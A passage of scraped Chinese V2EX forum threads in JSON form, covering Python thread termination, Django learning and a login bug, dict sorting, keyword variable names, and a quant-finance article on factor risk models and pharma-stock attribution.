ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)\r", "        raise SystemError(\"PyThreadState_SetAsyncExc failed\")\r", "\r", "def stop_thread(thread):\r", "    _async_raise(thread.ident, SystemExit)\r", "\r", "class TestThread(threading.Thread):\r", "    def run(self):\r", "        print \"begin\"\r", "        while True:\r", "            time.sleep(0.1)\r", "        print \"end\"\r", "if __name__ == \"__main__\":\r", "    t = TestThread()\r", "    t.start()\r", "    time.sleep(1)\r", "    stop_thread(t)\r", "    print \"stoped\"", "将线程所处理的 socket 句柄关闭即可（也就是通知客户端我将你的连接关闭了。）， recv 将自动抛异常关闭了。", "哦，对注意捕获 recv 异常。", "算了，算了， 不麻烦了， 我还是 setDaemon 方式退出拉倒。。。后事不料理了。。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前学过 Django ，除了模板不用（用 Vue ），其他的都想去深究下，目前打算撸官方文档，不知道这条路对不对～</p>\n</div></div>"], "reply": "8", "tittle": "自学 Django 你有什么好推荐的路线？", "comment": ["愚蠢的问题", "看到安生了， django 自学无路线直接玩", "我也在学，目前是官方文档大致看一下，然后做项目，遇到问题再查文档", " 如果有 Python 基础，可以直接找一套 Django 的开源代码边看边改。如果没学过 Python ，可以两个一起学。\r", "\r", " haha", "先把 Tutorial 的网六部分看一遍，就能了解基本的流程了。\r", "\r", "然后官方文档已经很完善了，写 model 就看 model 部分，写 view 就看 view 部分，很方便。\r", "属性和方法不清楚的直接翻源码就好啦。\r", "推荐 django 的 irc ，也不用说话，看别人的问题就能学到很多了。\r", "早年基础不好，用了两个月才写出一个能用的东西。对 Python 的熟悉程度高了很多。\r", "\r", "供参考", " 有对应的 URL 吗？", "Django 开发的知名项目，像 Sentry 可以用来参考\r", "\r", "\r", "还有一些个人开发的论坛，博客也也可以看看\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大家好，这两天老板让做个广告生成器，就类似购物网站的 banner ，从设计的角度来看，生成一个广告是需要遵守很多设计规则的，我在这里筛选了留白，视觉平衡等几个常见的规则来做的，但是现在生成的如下图：\n<img alt=\"06465F70-D980-4B64-BEAE-CE4206763EF4.jpg\" src=\"http://image.cethik.vip/images/2016/11/12/06465F70-D980-4B64-BEAE-CE4206763EF4.jpg\">\n就是发生元素之间重叠冲突的，而我理想的生成的东西应该类似这样：\n<img alt=\"77A0B09E-50B9-4BAA-AE6C-25A6882474E6.jpg\" src=\"http://image.cethik.vip/images/2016/11/12/77A0B09E-50B9-4BAA-AE6C-25A6882474E6.jpg\"></p>\n<p>或者是这样\n<img alt=\"F49C5399BED5F57B1F6ED237D73D55F7.png\" src=\"http://image.cethik.vip/images/2016/11/12/F49C5399BED5F57B1F6ED237D73D55F7.png\"></p>\n<p>所以现在想解决的问题就是在遵守我自己定义的规则前提下怎么避免元素之间的重叠冲突？有没有相关的优化算法。</p>\n<p>Ps ：用的是 python 的 PIL 做的。因为这个问题涉及到算法，数学，设计方面，放在这个节点下没问题吧。</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>谢谢各位前辈和同行的回复，昨天找到一篇文献和我的问题相关度比较高，算是得到一个不错的解决方案了吧，论文如下</p>\n<h1>文献</h1>\n<p>O’Donovan P, Agarwala A, Hertzmann A. Learning layouts for single-pagegraphic designs[J]. IEEE transactions on visualization and computer graphics, 2014, 20(8): 1200-1213.</p>\n<h1>论文链接</h1>\n<p>http://cloud.cethik.vip/index.php/s/daVFuTxu48kxBlZ</p>\n<p>这篇文章综合考虑了视觉平衡，元素重要度，元素对齐检测，布局优化（NIO算法）来进行图片设计，其中related work也有不少有意思的文献比如网页的响应式设计研究现状，有兴趣的各位可以看看。</p>\n<p>再次感谢各位</p>\n</div></div>"], "reply": "17", "tittle": "最近在做一个生产广告的小 demo，遇到元素冲突的问题，求解决方案", "comment": ["之前问过人，有人说这是凸优化里的一个经典的布局和定位问题，但是查了下感觉不是很符合要求", "然后看了下游戏引擎里面的冲突避免和碰撞检测，感觉有那么点关系，但是我并不是很擅长这个领域，求大神", "根据你提供的条件，我看着就像打水印。计算图片的高度宽度，再按照合适的方案安排文字。", " 水印的话位置应该没有那么多讲究，但是在设计师设计广告的时候会遵循很多设计规范的，比如对齐啦，留白啦这些东西，而且你看我生成的第一个方案就很丑，因为元素之间冲突了，我想做的是想让这些元素不要重叠冲突，而且前提是遵守我预定义的规则。 不知道我说清楚了么。。。", "没这么麻烦吧。。用\r", "1 、（字高+行距）* 行数\r", "2 、（字宽+间距）* 字数\r", "\r", "来分别定位。。不就行了", " 没懂，你这样只是知道了一段文字对应的像素长宽，如何避免出现类似我上传的第一张图那种情况？", "请问一下，广告要遵守的设计规则，例如留白，视觉平衡等，这些东西在看什么书、什么网站、什么教材可以学到呢？\r", "可以推荐一些网上的教材或者纸质书吗？\r", "谢谢。", " 你的图片素材的绘图原点（一般是左上角，由你算出来的 x ， y 决定。这样就不会重叠了）", "如果设计真的能生成就好了。", " 图片和文字的位置都是你可以控制的。总的宽度高度知道，图片的宽度和高度知道，算出图片左上角的坐标。就知道剩余的留白的位置了啊。然后再安排文字。", "把整个图片界面划分成格子 （ grid ），然后设计好文字图片等占据那些格子，算法上就很容易保证不重叠了吧。", " 我主要获取渠道是看论文，就是在谷歌学术上搜图片，审美一类的关键字，有不少人在做的。随便找一篇，然后看一下 related work,就能找到不少你想要的", " \r", " \r", "可能是我问题没有表述清楚，因为现在不只是重叠冲突的问题，因为我的生成器是需要满足一些自定义的设计规则，就比如对齐吧，在保证元素左对齐或者上对齐的情况下避免重叠，这个就设计一个对齐检测的东西，再比如一个视觉平衡的规则，要求每个元素的重心在规定好的位置的前提下避免重叠，就好像本科学的拉格朗日乘数法，是要在函数的自变量满足一定的约束条件下求解函数的最优值。。。不知道我说清楚了么。。。\r", "\r", "我昨天没有回复是因为找了一晚上的文献，不好意思哈，这是我找到的一个不错的方案\r", "O ’ Donovan P, Agarwala A, Hertzmann A. Learning layouts for single-pagegraphic designs[J]. IEEE transactions on visualization and computer graphics, 2014, 20(8): 1200-1213.\r", " \r", "这个方法不错诶，我之前看游戏里面的碰撞检测的时候也是怎么做的，厉害！\r", "\r", "我昨天没有回复是因为找了一晚上的文献，不好意思哈，这是我找到的一个不错的方案\r", "O ’ Donovan P, Agarwala A, Hertzmann A. Learning layouts for single-pagegraphic designs[J]. IEEE transactions on visualization and computer graphics, 2014, 20(8): 1200-1213.", " 是呀，关键是要把这些设计规范和设计原则转化成数学建模，类似网页的那种响应式设计，我这个昨天找到了一个不错的解决方案，是一篇论文：\r", "O ’ Donovan P, Agarwala A, Hertzmann A. Learning layouts for single-pagegraphic designs[J]. IEEE transactions on visualization and computer graphics, 2014, 20(8): 1200-1213.", "很简单…你只需要研究一下 css 然后自己再实现一次， 4/！后使用里面的 float 属性。当然你也可以单纯实现这个属性。", " 你的意思是模拟 css 的 float 属性？诶，突然感觉这是个不错的 idea ！让我想想怎么模拟，因为有些东西在网页设计里很容易实现（标签很方便），但是在海报图片设计方面就比较难应用。。。", " 现在我看很多发论文的讨论都是通过把以前不可量化的东西现在用某种方式量化，然后出一篇论文的，记得有一个朋友就是把用户使用手机的用户体验分解成几个维度量化了下，发了篇论文。事实上如果有成熟的规范或者规则的话，设计应该也离自动化不远了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>先上代码：</p>\n<p>def userlogin(request):</p>\n<pre><code>if request.method == 'POST':\n    login_form = LoginForm(data=request.POST)\n\n    if login_form.is_valid():\n        data = login_form.data\n        user = authenticate(username=data['username'], password=data['password'])\n\n        if not User.objects.filter(username=data['username']).exists():\n            messages.add_message(request, messages.WARNING, '用户名不存在')\n            return HttpResponseRedirect(reverse('userlogin'))\n\n        if user is None:\n            messages.add_message(request, messages.WARNING, '用户名和密码无法匹配')\n            return HttpResponseRedirect(reverse('userlogin'))\n        \n        login(request, user)\n        return HttpResponseRedirect(reverse('index'))\nelse:\n    login_form = LoginForm()\n\ncontext = {'login_form': login_form}\n\nreturn render(request, 'templates/account/login.html', context)\n</code></pre>\n<p>问题是这样的，账号密码提交后，并没有跳转到 index 页面，而是给返回了一个 post 请求成功 200 状态码，而我在 django shell 中却能够正确显示 authenticate 的验证结果。苦恼。</p>\n</div></div>"], "reply": "4", "tittle": "小白， Django authenticate()函数认证问题。", "comment": ["在表单里显示一下错误呗，估计是 is_valid 方法没通过", "恩，我试了一下，果然是 is_valid()方法的问题，非常感谢。", " 我之前继承了 ModelForm 类，它不止验证信息是否填写完整而且还验证用户名是否存在，所以每次 is_valid()方法都过不去。。。", "退 django ，保平安\r", "用了 6 年 django 的表示，多数情况下还是 rails 来得爽"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>list = [ {'student_name': zhangsan, 'student_score': 65}, {'student_name': lisi, 'student_score': 95}, {'student_name': wangwu, 'student_score': 80}, {'student_name': maliu, 'student_score': 75}, {'student_name': zhuqi, 'student_score': 88} ]</p>\n<p>把 5 个学生成绩从高到低排序，取前三名，要怎么处理这样的 list ？</p>\n</div></div>"], "reply": "20", "tittle": "有这样一个 list，怎么把列表中的字典进行排序？", "comment": ["sort+lambda", "from operator import itemgetter\r", "\r", "lst = [ {'student_name': 'zhangsan', 'student_score': 65},\r", "         {'student_name': 'lisi', 'student_score': 95},\r", "         {'student_name': 'wangwu', 'student_score': 80},\r", "         {'student_name': 'maliu', 'student_score': 75},\r", "         {'student_name': 'zhuqi', 'student_score': 88} ]\r", "\r", "top3 = sorted(lst, key=itemgetter('student_score'), reverse=True)[:3]\r", "\r", "print top3", "   \r", "sorted(list, key=lambda student_score:student_score[1], reverse=True)[0:3]\r", "\r", "这样解决，出错，结果不对。。。", "def score(s): \r", "       return s['student_score']\r", "\r", "bar = sorted(foo, key = score)\r", "\r", "print(bar)", " 赞！刚查书去，二楼的方法也是书上推荐的标准做法", " print sorted(list, key=lambda student: student['student_score'])[-3:]", "[:3]  这个表情好搞笑", " 居然还有这种书", "In [12]: import heapq\r", "\r", "In [13]: from operator import itemgetter\r", "\r", "In [14]: scores = [ {'student_name': 'zhangsan', 'student_score': 65}, {'student_name': 'lisi', 'student_score': 95}, {'student_name':'wangwu', 'student_score': 80}, {'student_name': 'maliu', 'student_sco\r", "    ...: re': 75}, {'student_name': 'zhuqi', 'student_score': 88} ]\r", "\r", "In [15]: heapq.nlargest(3, scores, key=itemgetter('student_score'))\r", "Out[15]: \r", "[{'student_name': 'lisi', 'student_score': 95},\r", " {'student_name': 'zhuqi', 'student_score': 88},\r", " {'student_name': 'wangwu', 'student_score': 80}]", " 就是 Python 核心编程那本书啊", " 谢谢，这个方法也 OK ^-^", "python cookbook 里肯定是提了 第 1 章.", " 是，去翻了， 1.13 节有讲", "楼上正确， sorted （ list, key=itemgetter )然后取前三个，好像很多书里都有讲过类似的 QAQ", "top3 = sorted(list, key=lambda stu:int(stu['student_score']), reverse=True)[0:3]", "lst = [ {'student_name': 'zhangsan', 'student_score': 65}, \r", "{'student_name': 'lisi', 'student_score': 95}, \r", "{'student_name': 'wangwu', 'student_score': 80}, \r", "{'student_name': 'maliu', 'student_score': 75}, \r", "{'student_name': 'zhuqi', 'student_score': 88} ] \r", "\r", "\r", "sorted(lst, key=lambda stu: stu[\"student_score\"], reverse=True)[:3]\r", "\r", "明明就可以", " 确实可以 lol", "请大家参考 python 官方高级数据结构 heapq 章节，可以使用内置高效的方法来最简单的实现\r", "\r", "students_list = [ {'student_name': 'zhangsan', 'student_score': 65}, \r", "{'student_name': 'lisi', 'student_score': 95}, \r", "{'student_name': 'wangwu', 'student_score': 80}, \r", "{'student_name': 'maliu', 'student_score': 75}, \r", "{'student_name': 'zhuqi', 'student_score': 88} ] \r", "\r", "\r", "####################\r", "import heapq\r", "\r", "score_first_3 = heapq.nlargest(3,students_list,key=lambda student:student[\"student_score\"])\r", "\r", "print score_first_3\r", "####################", "sorted_dict = sorted(dict.items(), key=lambda item: item[1])", " 语法上看不是最简单的，难道用 heapq 的效率更高？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>ref: <a href=\"http://weibo.com/ttarticle/p/show?id=2309404041496792822800\" rel=\"nofollow\">http://weibo.com/ttarticle/p/show?id=2309404041496792822800</a></p>\n<p>我学的也不深，不过可以说说经验和看法。现在说的，可能两年以后看又不一样，仅供参考。</p>\n<p>--</p>\n<p>9 月中旬开始学 Django ，到 10 月 23 号发布 <a href=\"https://www.leavesongs.com/SHARE/mooder.html\" rel=\"nofollow\">Mooder 团队贡献系统</a> 。说一下我是怎么学 Django 的。</p>\n<p>首先， Django 确实是一个让人爱不释手的 Web 开发框架，他的角色类似于 Ruby on rails ，是敏捷开发的首选。他的定位和 Flask 是不一样的，后者非常灵活，很轻。但当你使用后者开发完一个完整网站后，你会发现：咦，其实你也用到了大量​第三方模块，总体重量和 Django 也没太大区别了。</p>\n<p>​ Django 集成了很多模块，比如它自带 Model 、 Form 、 Templates ，而 Flask 则需要引入 SQLAlchemy 、 WTForm 、 Jinja2（自带） 等模块。所以，很多 Django 教程都是从整体入手的，在你什么都不懂的情况下，你读教程会发现：咦，各种看不懂，互相有牵扯，除非全部读完，很多人读了一半可能就放弃了。</p>\n<p>教程还是推荐 《<a href=\"http://djangobook.com/\" rel=\"nofollow\">Django Book</a>》，不要看中文版，中文版太老了，大量 Django 的好用的一些特性都没有。除非你能找到 Django 1.10 的。</p>\n<p>因为之前有 Tornado 和 Flask 开发经验，所以很多概念我上手比较快。特别是 Form ，以前做其他语言开发都没用过。如果你没接触过 Python 开发的话，建议看看这几个视频教程（建议先看 1 或 3 ）：</p>\n<p><a href=\"https://www.youtube.com/playlist?list=PLEsfXFp6DpzQFqfCur9CJ4QnKQTVXUsRy\" rel=\"nofollow\">Try Django 1.9 -- Build a Django Blog -- Django 1.9, Bootstrap 3.3, &amp; More.</a></p>\n<p><a href=\"https://www.youtube.com/playlist?list=PLEsfXFp6DpzQB82YbmKKBy2jKdzpZKczn\" rel=\"nofollow\">Advancing the Blog from Try Django 1.9</a></p>\n<p>​<a href=\"https://www.youtube.com/playlist?list=PLEsfXFp6DpzQSEMN5PXvEWuD2gEWVngCZ\" rel=\"nofollow\">Try Django 1.10 - A URL Shortening Service</a></p>\n<p>​这个小哥讲的特别清楚，而且很勤奋，这上面多个 Django 教程都是他讲的。不过教程是英文的，建议打开 Youtube 的字幕（最好是看英文字母，不要自动翻译，自动翻译的没法看），配合代码一起看也不难。</p>\n<p>​通常学 Django 都会写一个博客，通过实践来学习。这个路子还是蛮正确的，上面的视频教程也是从写博客入门的。不过我感觉博客轮子太多了，也可以找点别的东西写，比如第三个教程就是写一个短链接平台。</p>\n<p>​另外，学的时候可以找个开源程序做参考，比如 <a href=\"https://www.leavesongs.com/SHARE/mooder.html\" rel=\"nofollow\">Mooder 团队贡献系统</a> ，再推荐一个 <a href=\"https://github.com/djangoStudyTeam/DjangoBlog\" rel=\"nofollow\">djangoStudyTeam / DjangoBlog</a> 。有不懂的地方可以去看看别人的代码。</p>\n<p>英文不好的同学……学习难度会上几个层次，实在没什么可帮你的，看看这两个吧，<a href=\"http://www.ziqiangxuetang.com/django/django-tutorial.html\" rel=\"nofollow\">Django 基础教程</a> 、<a href=\"https://www.v2ex.com/t/284762\" rel=\"nofollow\">django 的视频教程</a> 。（还是不建议看中文的，这种多半会因为太基础或讲的不好而半途而废）</p>\n<p>​上手 Django 以后，你会发现很多第三方库将减少你大部分工作量。比如 Mooder 用到的 django-registration-redux ，配合 Django 自带的 auth ，你只需要写模板+扩展逻辑（比如我将用户名登陆改成邮箱登录），其他的包括登录、注册、邮件验证、密码找回、密码修改等逻辑都不需要写啦。</p>\n<p>这里再推荐一些插件： <a href=\"http://www.dear-shen.com/2016/06/15/django%E5%B8%B8%E7%94%A8%E4%B8%89%E6%96%B9%E5%BA%93\" rel=\"nofollow\">Django 常用三方库</a>​ ，大多数都比较实用。</p>\n<p>最后，我说一下 Django 比较适合的场景吧。 Django 当然做什么都可以，但最适合需要“赶进度”的项目，因为用它开发真的的很快， Django 自带的后台也特别实用；另外，在数据库逻辑关系非常复杂的情况下，你会发现 Django 的 Model 简直太好用的，关系对象之间的互相引用信手拈来，可以简化大量数据库操作。</p>\n<p>不知道学 Django 的人多不多，多的话可以拉个学习小组，有心的同学可以组织一下~</p>\n</div></div>"], "reply": "8", "tittle": "一些 Django 学习指南", "comment": ["mark  谢谢推荐", "非常好！", "我平时也用一些 Python ，如果写用 Python 写 Web 的话，我只用 Django 。\r", "现在在我这里， Django 唯一的问题是官方没有对 MongoDB 进行支持，虽然可以通过其他的方案进行解决，但是总有一些让人不爽的地方。", "mk,最近有点想造个不一样的轮子玩儿", "mark ，同需要小組。", "太感谢了，正在啃 Tango with Django", "mark", "感谢，原来是时雨牛啊"]},
{"content": ["<div class=\"topic_content\">比如我想用 pass 作为密码变量，但是受制于关键字的限制，在 c# 中可在变量名前面加 @ 符号， python 有办法吗？</div>"], "reply": "19", "tittle": "Python 如何在代码中使用关键字作为变量名？", "comment": ["setattr", "挖坑现场😂", "mark", "挖坑现场😂", "pass_", "可以用谐音，例如 clazz\r", "\r", "ps ，为何要给自己过不去…", "_pass\r", "貌似 python 里面有以_开头作为变量命名的规则吧", " 单下划线开头好像是类的 private 成员的意思来着（？）", "5 楼正解 PEP8", "密码变量不是 password passwd passphare ？", "simple answer: don't", " klass 也可以\r", "\r", "这真的还是挖坑现场啊……", "我也想在我们那边推广 @那套（或者 lisp 那边是两条竖线），准备用#，不过估计没人支持……", "加_后缀和加 word 后缀有啥本质区别？\r", "LZ 的目的本身就很不合理", "密碼不是 password?", "用另一个缩写 passwd", "自己给自己挖坑~", "我也想问,楼主为什么自己和自己过不去?还是最近工作比较闲= _=!", "pwd 不行么..."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2><strong>新鲜出品:<a href=\"https://www.ricequant.com/community/topic/1599/?utm_source=v2ex\" rel=\"nofollow\">https://www.ricequant.com/community/topic/1599/?utm_source=v2ex</a></strong></h2>\n<p>ps ：文末有彩蛋</p>\n<p>让我来写这篇文章我是拒绝的，一棵入市不过 2 年的小韭菜有什么资格和经验来讲风险？但小韭菜就是胜在无畏，敢聊最难的话题。今天，就来和大家来谈一谈，风险到底是个什么东西。\n通常来讲，我们做投资的目的都是找到一组对证券风险和收益关系的最优权衡，感谢 Markowitz ，从此我们只需要从风险和收益这两个维度对投资原因和结果进行分析。先来看收益，对于收益，我们只需要定义一个时间区间，就可以用一个简单的公式表述收益：\n<img alt=\"\" src=\"http://i1.piimg.com/567571/ec1756b09b87e06c.png\">\n同样也是投资行为的收益，因此两者结合即是设定区间 内的收益总量。当然需要强调的是，𝑟并不一定总是一个正值，市场价格的下跌或者我们自 己投资管理决策的失误，都会导致最终的收益率为负。</p>\n<p>还好我们对收益的定义非常直观，这样就可以好好的来讲一讲风险了。</p>\n<p>风险\n风险的定义要抽象很多，而且，对于风险的表述没有统一的标准，对不同偏好的人在不同的场景下，风险的意义也不同。但对于投资来说，我们迫切需要找到一个可操作的、普适的以及客观的风险 定义，这个定义不能被投资者的主观偏好所影响，又要真实地反映我们对风险这个概念的普 遍认知。而这既是投资管理研究的必要步骤，也是风险管理模型效果的关键与基础。</p>\n<p>均值-方差投资组合理论（ MPT ）是金融理论的基础， Harry Markowitz 提出了用资产收益率在一定时间区间内的波动率来定义风险，从数 学上来说，即资产收益率在一定区间内的标准差（ standard deviation ）,用公式表达如下：\n<img alt=\"\" src=\"http://p1.bqimg.com/567571/1b25a2736ad39288.png\">\n<img alt=\"\" src=\"http://p1.bqimg.com/567571/de251a7498527f34.png\"></p>\n<p><img alt=\"\" src=\"http://p1.bqimg.com/567571/58f889990656c5d5.png\"></p>\n<p>仅仅当 A 与 B 两种资产完全相关，即相关系数为 1 时，等号才能成立。对于多种资产的情况，我们也有类似的结论。由此，我们在数学上证明了“把鸡蛋放在不同篮子里可以降低风险”</p>\n<p><img alt=\"\" src=\"http://i1.piimg.com/567571/f9b7e46b98142816.png\"></p>\n<p>有了收益和风险的定义，我们就可以固定预期收益，通过调整资产比重来获得标准差最小的资产组合了。我们称之为有效前沿(efficient frontier)。威廉夏普把不同预期收益和标准差的好坏用夏普比例统一起来：</p>\n<p><img alt=\"\" src=\"http://i1.piimg.com/567571/0a7fb98ffcce3f16.png\"></p>\n<p>我们知道，一个配置的夏普比率等同于连接无风险资产和这个配置的直线的坡度；如果我们固资本市场线了，资本市场线上的每一点代表的投资组合比马科维茨有效边界上的投资组合更优，其能够通过改变市场投资组合和无风险资产之间任意配比而达到资本市场线上的任意一点（前提是允许卖空）。其方程可以表示为：</p>\n<p><img alt=\"\" src=\"http://i1.piimg.com/567571/0a7fb98ffcce3f16.png\"></p>\n<p><img alt=\"\" src=\"http://i1.piimg.com/567571/a2e089460b6b62a7.png\"></p>\n<p>关于 MPT 的详细内容，可以点击这里查看： [ MPT ] 经典投资组合理论的优化 （一键即克隆代码，小朋友们别拿这个交作业哟～）</p>\n<p><strong>多因子模型</strong>\n在一个冰冷的波动率数字面前，我们很难对风险进行解释，这个时候我们就需要想办法分解风险了，在分解风险之前，我们先看看怎么分解收益。</p>\n<p>为此，<strong>CAPM</strong>模型完善了资产收益来源于资产所承担的风险这一投资的核心概念，但美中不足的是，模型将市场风险仅仅归纳于同市场的变动有关， Ross 认为解释收益的因素不是唯一的，预期收益率可以拓展成多个因子共同决定的结构，而这就是大名鼎鼎的<strong>APT 模型。</strong></p>\n<p><img alt=\"\" src=\"http://i1.piimg.com/567571/2b45ff818dbcec52.png\"></p>\n<p>表示因子 j 的风险溢价。风险溢价的出现时因为人们需要更高的收益去补偿其受到的更高风险。可以很明显的发现套利定价模型模型是资本资产定价模型（ CAPM ）的推广形式， CAPM 使用了市场回报作为其唯一的因子。</p>\n<p>在这里，我们需要做出两个假设：</p>\n<p><img alt=\"\" src=\"http://i1.piimg.com/567571/eb25d2ee0669affe.png\"></p>\n<p>如此一来，我们成功的把单个资产的收益拆分为两个部分，第一部分是共同因子的回报，第二部分是与共同因子无关的个股特殊回报。\nps ：此处我们参照 Fama 为因子构建了一个组合，由组合收益率代表因子收益率</p>\n<p>直观一点的解释就是，假如著名的券商影子股吉林敖东在金融行业因子敏感度是 0.6 （这意味着金融行业的波动为 1%时，可能会造成吉林敖东 0.6%的波动）</p>\n<p>下图为米筐 RQbeta 归因分析系统对投资组合因子（比如杠杆率、历史业绩、流动性等等）的归因示意图</p>\n<p><img alt=\"\" src=\"http://i1.piimg.com/567571/c3a996a42f716c6a.png\"></p>\n<p>当然，由于 APT 本身没有对因子进行选择，所以任何可以有效解释收益来源的模型都可以是 APT 模型。有一天， Rosenberg 在 APT 和自己研究的基础上，对可能的因子进行了归类，后来通过因子的风险边际贡献来分解风险，并诞生了如今广为使用的 Barra 模型。</p>\n<p><img alt=\"\" src=\"http://p1.bqimg.com/567571/7b8391518109d7ee.png\"></p>\n<p>当然，大牛们对因子也有各种不同的选择，可以看上图，这里不展开说明，大家可以在下面的文章中找到详细的说明：\n#让我们用 python 跑回归#Fama-French 三因素模型（一）</p>\n<p>Fama 三因素模型（三）因子风险暴露 Factor Risk Exposure</p>\n<p>Fama 三因素模型（四） Fama 五因素模型！</p>\n<p>归因分析实例\n由于我对医药股的个人偏好，我们就来看一下几个有趣的医药股的归因分析实例，一些统计不显著的因子会被赋 0 值。</p>\n<p>吉林敖东</p>\n<p>券商影子股吉林敖东是广发证券的第一大股东。公司持有广发证券境内上市内资股（ A 股）股份 1,251,597,867 股，占广发证券总股本的 16.42 ％；本公司全资子公司敖东国际（香港）实业有限公司持有广发证券境外上市外资股（ H 股）股份 20,237,400 股，占广发证券总股本的 0.27%，总计持有广发证券 16.69%的股份。目前吉林敖东市值约 236 亿，持有广发证券市值约 210 亿。</p>\n<p>不仅如此，吉林敖东还持有亚泰集团，中国平安，认购二级市场和一级市场基金，一共大约 10 亿人民币，以及“主营业务”医药部分，扣除负债后净资产约为 25 亿人民币，年利润 3.4 亿（ 2015 年报数据）可以看出， 210+10 ＋ 25&gt;236 当然我们不能这么比较。如果以估值最低的中药公司华润三九 20 倍 PE 左右进行估值，医药部分的业务应该值 68 亿左右。同时持有的广发证券股票如果全数卖出是要交不少税的，这部分应予以扣减。</p>\n<p>简单的小学生级别的分析我们就可以看出，由于持有大量的广发证券股票，吉林敖东已经是一家“券商”而非“医药企业”，我们来用 RQbeta 因子模型来看一下对行业因子的敏感度：</p>\n<p><img alt=\"\" src=\"http://p1.bqimg.com/567571/9b993f9bc7b3e087.png\"></p>\n<p>从图中可以看出，吉林敖东对金融板块的敏感度超过其他板块，并且有越来越大的趋势，而对医疗行业的敏感度并不高甚至在下降。由此我们可以大致得出一个结论：</p>\n<p>不对金融板块风险进行对冲，押注吉林敖东的价值回归是不明智的</p>\n<p>这和我们从分析出的结论是一致的。下面来看一下基本面因子，可以看出在过去一年半的时间里，对于吉林敖东来说， earning 是一个敏感度非常稳定的因子，但是因子的绝对值并不高。整个低估值板块相对涨幅 10%不过能为吉林敖东贡献 1-2%的上涨。</p>\n<p><img alt=\"\" src=\"http://p1.bqimg.com/567571/97f59b4e7a5d372e.png\"></p>\n<p>东阿阿胶</p>\n<p>关于东阿阿胶的分析其实特别多，相对而言，笔者更愿意拿日本作为对比，在 80 年代，日本的新药审批体系还没有完善，当时有一款神药云芝多糖 K （ Krestin ），是从多孔菌科植物——云芝的菌丝体中提取的高分子糖肽聚合物，它是一种化学惰性物质，对人体几乎没有作用。在美国和欧洲等发达国家，云芝多糖 K 由于缺乏有效性，未能获得监管部门的批准。然而在日本，该产品由于绝对的安全性成功上市，临床应用于抗肿瘤， 1986 年成为最畅销的药品，销售额高达 500 亿日元（ 2.96 亿美元）。像云芝多糖 K 这样安全无效的抗肿瘤药， 80 年代每年的销售额可以达到 10 亿美元，占据 20%左右的肿瘤药市场规模（是不是熟悉的配方，熟悉的味道...）。</p>\n<p>由于日本 MWH 特殊的新药审批政策，过于重视新药的安全性而忽视有效性，所以日本制药企业研发的新药往往只能在日本上市，称之为“本土新药”。据统计，在日本市场上市的新药中，“本土新药”的比例一度超过 40%，远高于欧美企业（是不是熟悉的配方，熟悉的味道...）。</p>\n<p>阿胶在一季报不及预期后，当日大跌 6.5%</p>\n<p><img alt=\"\" src=\"http://p1.bqimg.com/567571/8579450997ea6e15.png\"></p>\n<p>后来阿胶连发管理层增持，华润增持公告，半年报前海人寿也来凑热闹几近举牌线，阿胶很是争气低位大涨 50%</p>\n<p><img alt=\"\" src=\"http://p1.bqimg.com/567571/be5c15bfb894e79e.png\"></p>\n<p>我们不争论熬驴皮到底有没有效果，来看一看阿胶对于行业因子的敏感性：</p>\n<p><img alt=\"\" src=\"http://p1.bqimg.com/567571/ec4ef42914ec7c6c.png\"></p>\n<p>可以看出，虽然很多人对东阿阿胶的有效性提出质疑，但是东阿阿胶在医药因子的敏感性还是不低的，大家还是把阿胶当成医药股来对待的，由于近期的增持事件，阿胶的敏感性有所下降。</p>\n<p>再来看一下基本面因子：</p>\n<p><img alt=\"\" src=\"http://p1.bqimg.com/567571/cf6d660639b82a02.png\"></p>\n<p>我们可以看到，阿胶和敖东一样对利润的敏感性一直很稳定。关于阿胶靠提价成长的战略有没有错这里我就不发表自己的观点了，只是如果利润有所下滑，会比较明显的对股价有一定的压制。</p>\n<p><strong>复星医药</strong></p>\n<p>前面都是不那么“纯正”的医药股，最后我们来看一看复星医药这个“似乎纯正”的医药股，复星旗下有特别多的医药类子公司，所以，<strong>复星看是医药公司，但实质是创投公司。</strong>旗下的那么多资产不可能都作出准确的评估，所以市场给一定折价是必然的。</p>\n<p>我们来看看行业因子敏感度：</p>\n<p><img alt=\"\" src=\"http://p1.bqimg.com/567571/01ad9595fc968fb5.png\"></p>\n<p>可以看出，复星的因子敏感度在已选的几个行业因子上都并不高，尤其是在医药板块的敏感度居然只有 0.3 左右，可以看出我们选的因子并不能很好的对复星的收益进行解释。</p>\n<p>再来看看基本面因子：</p>\n<p><img alt=\"\" src=\"http://p1.bqimg.com/567571/fa6a316a2643eb66.png\"></p>\n<p>最大的市值因子敏感度也只有 0.25 。虽然估值很低，但是收益因子的敏感度居然只有 0.1 左右。</p>\n<p>所以我们已有的几个因子都很难解释复星的收益</p>\n<p>复星看是医药公司，但实质是创投公司。对于创投公司，最大的风险就是老郭的人品了。这个就靠大家自己分析了。</p>\n<p><strong>彩蛋</strong>\n下一次我们会展开介绍一下大名鼎鼎的 barra 机构化风险模型，在这之前我们来扒一下 Barra Rosenberg 的往事，当年的 Rosenberg 在 UC Berkeley 任教，教授金融学、经济学和计量经济学，名利双收。他老人家自然患上了那个时代金融显贵的高消费习惯，香槟， Party, Cruise ，都是生活的必备品。</p>\n<p><img alt=\"\" src=\"http://p1.bqimg.com/567571/4a9de83e9881b075.png\"></p>\n<p>就这样来到了 1969 年的某一天，一位热心肠的学生建议咱们的 Professor 考虑下 boat house,就是把旧船改造成自己的住所，然后停泊在旧金山的渔人码头附近，享受下生活。这哥们估计是把旧金山富二代的 Style 吹的天花乱坠，打动了 Professor 的心。然而 Rosenberg 回家一合计，钱不够！于是，在这位同学的建议下， Rosenberg 辞职下海，开始了投资实务之旅。</p>\n<p><img alt=\"\" src=\"http://p1.bqimg.com/567571/843de7f6d45aa59b.png\"></p>\n<p>1974 年，个人公司巴尔·罗森伯格联合公司（ Barr Rosenberg Associates ）成立，就是今天还在 Berkeley Downtown 的 BARRA ，后来 Barra 被 Morgan Stanley 买下，今天被称为 MSCI Barra.</p>\n<p>1985 年， Rosenberg Institutional Equity Management （ RIEM ）公司，后来被 AXA Company 收购，称为 AXA Rosenberg,位于加洲旧金山以东 40 分钟的 Orinda ， 